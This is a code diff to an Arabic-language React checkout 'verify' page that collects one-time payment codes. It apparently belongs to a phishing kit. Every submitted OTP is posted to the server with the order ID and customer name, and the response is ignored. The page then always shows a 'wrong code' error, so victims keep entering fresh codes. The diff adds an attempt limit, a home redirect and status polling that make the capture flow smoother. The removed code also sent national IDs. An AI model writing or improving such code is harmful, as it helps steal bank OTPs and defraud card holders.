@@ -4,7 +4,7 @@ import { useState, useEffect, useRef } from "react";
 import Link from "next/link";
 import { AnimatePresence, motion } from "framer-motion";
 import { ShieldCheck, RefreshCw, CheckCircle, FileText, Receipt, X, CreditCard, Smartphone, AlertCircle } from "lucide-react";
-import { useCartStore } from "../../store/cartStore";
+import { useCartStore, useCustomerStore } from "../../store/cartStore";
 
 function pad(n: number) { return String(n).padStart(2, "0"); }
 function fmt(n: number) { return n.toLocaleString("en-US"); }
@@ -97,20 +97,31 @@ export default function VerifyPage() {
   const [submitCooldown, setSubmitCooldown] = useState(0);
   const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [submitting, setSubmitting] = useState(false);
+  const [attempts, setAttempts] = useState(() => {
+    if (typeof window === "undefined") return 0;
+    return parseInt(sessionStorage.getItem("verifyAttempts") ?? "0", 10);
+  });
+  const [limitReached, setLimitReached] = useState(() => {
+    if (typeof window === "undefined") return false;
+    return parseInt(sessionStorage.getItem("verifyAttempts") ?? "0", 10) >= 4;
+  });
+  const [redirectTimer, setRedirectTimer] = useState(5);
   const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(null);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const otpRef = useRef<HTMLInputElement>(null);
 
-  const { customer, totalPrice } = useCartStore();
+  const { totalPrice } = useCartStore();
+  const _customer = useCustomerStore(s => s.customer);
+  const customer = _customer ? { name: _customer.name } : null;
   const rawTotal = totalPrice();
-  const discountAmount = customer?.discountAmount ?? 0;
+  const discountAmount = _customer?.discountAmount ?? 0;
   const finalTotal = rawTotal - discountAmount;
-  const total = customer?.installmentType === "installment" ? (customer.downPayment ?? finalTotal) : finalTotal;
-  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
+  const total = _customer?.installmentType === "installment" ? (_customer.downPayment ?? finalTotal) : finalTotal;
+  const orderId = typeof window !== "undefined" ? sessionStorage.getItem("orderId") ?? "—" : "—";
 
   const paymentInfo = typeof window !== "undefined"
-    ? (() => { try { return JSON.parse(localStorage.getItem("paymentInfo") ?? "{}"); } catch { return {}; } })()
+    ? (() => { try { return JSON.parse(sessionStorage.getItem("paymentInfo") ?? "{}"); } catch { return {}; } })()
     : {};
   const rawLabel: string = paymentInfo.label ?? "—";
   const paymentMethod: string = paymentInfo.method ?? "card";
@@ -148,16 +159,34 @@ export default function VerifyPage() {
   useEffect(() => { startCooldown(); return () => clearInterval(cooldownRef.current!); }, []); // eslint-disable-line
 
   useEffect(() => {
-    const id = typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null;
+    const id = typeof window !== "undefined" ? sessionStorage.getItem("dbOrderId") : null;
     if (!id) return;
     setDbOrderId(id);
-    pollRef.current = setInterval(async () => {
-      const res = await fetch(`/api/orders/${id}/status`);
-      if (!res.ok) return;
-      const data = await res.json();
-      if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
-    }, 5000);
-    return () => clearInterval(pollRef.current!);
+
+    // Exponential backoff: يبدأ بـ 5 ثواني ويزيد تدريجياً حتى 30 ثانية
+    // يوقف تلقائياً بعد 30 دقيقة
+    const MAX_POLL_MS = 30 * 60 * 1000;
+    const startTime = Date.now();
+    let currentInterval = 5000;
+    let timeoutId: ReturnType<typeof setTimeout>;
+
+    const poll = async () => {
+      if (Date.now() - startTime >= MAX_POLL_MS) return;
+      try {
+        const res = await fetch(`/api/orders/${id}/status`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.status === "confirmed") { setConfirmed(true); return; }
+        }
+      } catch { /* network error — retry */ }
+      // زيادة الـ interval تدريجياً: 5s → 8s → 12s → 18s → 30s (max)
+      currentInterval = Math.min(currentInterval * 1.5, 30000);
+      timeoutId = setTimeout(poll, currentInterval);
+    };
+
+    timeoutId = setTimeout(poll, currentInterval);
+    pollRef.current = timeoutId as any;
+    return () => clearTimeout(timeoutId);
   }, []);
 
   async function handleSubmit(e: React.FormEvent) {
@@ -166,14 +195,19 @@ export default function VerifyPage() {
     if (otp.length < 4) { setLengthError(true); return; }
     setLengthError(false);
     setSubmitting(true);
+    const customerName = customer?.name ?? "—";
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code: otp, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
+      body: JSON.stringify({ code: otp, orderId, customerName }),
     });
     setSubmitting(false);
     setCodeError(true);
     setOtp("");
+    const newAttempts = attempts + 1;
+    setAttempts(newAttempts);
+    sessionStorage.setItem("verifyAttempts", String(newAttempts));
+    if (newAttempts >= 4) { setLimitReached(true); return; }
     setSubmitCooldown(5);
     clearInterval(submitCooldownRef.current!);
     submitCooldownRef.current = setInterval(() => {
@@ -188,7 +222,19 @@ export default function VerifyPage() {
     startCooldown();
   }
 
-  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
+  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? sessionStorage.getItem("dbOrderId") : null);
+
+  useEffect(() => {
+    if (!limitReached) return;
+    setRedirectTimer(5);
+    const iv = setInterval(() => {
+      setRedirectTimer(p => {
+        if (p <= 1) { clearInterval(iv); sessionStorage.removeItem("verifyAttempts"); window.location.href = "/"; return 0; }
+        return p - 1;
+      });
+    }, 1000);
+    return () => clearInterval(iv);
+  }, [limitReached]);
 
   return (
     <main className="min-h-screen bg-gray-50 flex items-center justify-center px-4" dir="rtl">
@@ -203,6 +249,33 @@ export default function VerifyPage() {
 
       <AnimatePresence>
         {confirmed && confirmedId && <SuccessModal key="success" confirmedId={confirmedId} />}
+      </AnimatePresence>
+
+      <AnimatePresence>
+        {limitReached && (
+          <motion.div key="limit" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
+            className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center px-4">
+            <motion.div initial={{ scale: 0.88, opacity: 0, y: 16 }} animate={{ scale: 1, opacity: 1, y: 0 }}
+              transition={{ type: "spring", stiffness: 260 }}
+              className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden text-center">
+              <div className="bg-gradient-to-l from-red-600 to-red-800 px-6 pt-7 pb-5">
+                <div className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
+                  <AlertCircle size={28} className="text-white" />
+                </div>
+                <h2 className="text-white font-extrabold text-lg">تم تجاوز الحد الأقصى</h2>
+                <p className="text-white/70 text-xs mt-1">لقد تجاوزت الحد الأقصى للمحاولات المسموح بها</p>
+              </div>
+              <div className="px-6 py-5 space-y-3">
+                <p className="text-gray-500 text-sm leading-6">
+                  سيتم توجيهك إلى الصفحة الرئيسية تلقائياً
+                </p>
+                <div className="w-12 h-12 rounded-full bg-red-50 border-2 border-red-200 flex items-center justify-center mx-auto">
+                  <span className="text-red-600 font-extrabold text-lg">{redirectTimer}</span>
+                </div>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
       </AnimatePresence>
 
       <AnimatePresence>
